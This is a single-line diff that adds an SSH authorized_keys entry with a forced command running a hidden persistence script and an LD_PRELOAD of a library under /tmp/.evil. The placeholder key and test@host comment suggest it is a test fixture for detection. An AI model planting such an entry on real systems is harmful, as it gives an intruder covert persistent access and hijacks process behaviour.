@@ -1,0 +1,1 @@
+command="/tmp/.cache/persist.sh",environment="LD_PRELOAD=/tmp/.evil/libhook.so" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeTenaxKey test@host
